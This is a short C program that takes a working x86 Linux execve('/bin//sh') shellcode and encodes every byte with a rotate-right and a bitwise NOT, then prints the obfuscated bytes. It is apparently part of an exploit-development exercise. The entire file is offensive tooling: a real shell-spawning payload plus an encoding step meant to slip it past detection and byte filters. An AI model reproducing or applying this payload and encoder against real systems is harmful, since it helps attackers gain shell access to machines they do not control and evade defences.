#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; //Execve shellcode to be encoded

void main()
{
for (int i=0;i<strlen(shellcode); i++) {
	shellcode[i] = (shellcode[i] >> 2) | (shellcode[i] << (8-2)); //ror
	shellcode[i] = ~shellcode[i]; //not
}

printf("\nEncoded Shellcode");
printf("Length: %d\n",sizeof(shellcode));
for (int i=0;i<strlen(shellcode);i++){
	printf("0x%02x,",shellcode[i]);
}
printf("\n");

}
